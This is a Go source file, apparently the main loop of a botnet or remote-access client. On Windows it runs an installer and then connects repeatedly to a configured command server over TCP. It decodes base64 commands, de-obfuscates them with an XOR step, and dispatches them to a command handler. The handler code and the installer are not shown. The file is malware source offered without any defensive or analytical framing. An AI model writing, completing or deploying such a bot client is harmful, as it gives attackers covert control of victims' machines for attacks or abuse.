package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"homo/client/balancer"
	"homo/client/config"
	"homo/client/installer"
	"homo/client/methods"
	"net"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	defer methods.Catch()

	if runtime.GOOS == "windows" {
		installer.InstallerWin()
	}
	exec.Command("ulimit", "-n", "99999")
	exec.Command("ulimit", "-n", "999999")

CONNECT:
	connection, err := net.Dial("tcp", config.TARGET_SERVER+":"+config.TARGET_PORT)

	if err != nil {
		fmt.Println(err)
		time.Sleep(1 * time.Second)
		goto CONNECT
	}

	for {

		command := make([]byte, 6000)

		_, err := connection.Read(command)
		if err != nil {
			goto CONNECT
		}

		if bytes.HasPrefix(command, []byte{112, 105, 110, 103}) { // ping message
			continue
		}

		if bytes.HasPrefix(command, []byte{0, 0, 0, 0, 0, 0, 0}) { // nil message
			continue
		}

		var cmd string
		_command, _ := base64.RawStdEncoding.DecodeString(string(command))

		for _, i := range _command {
			cmd += string(i ^ 29>>3)
		}

		CommandHandler(cmd)
		balancer.Balancer()
	}
}
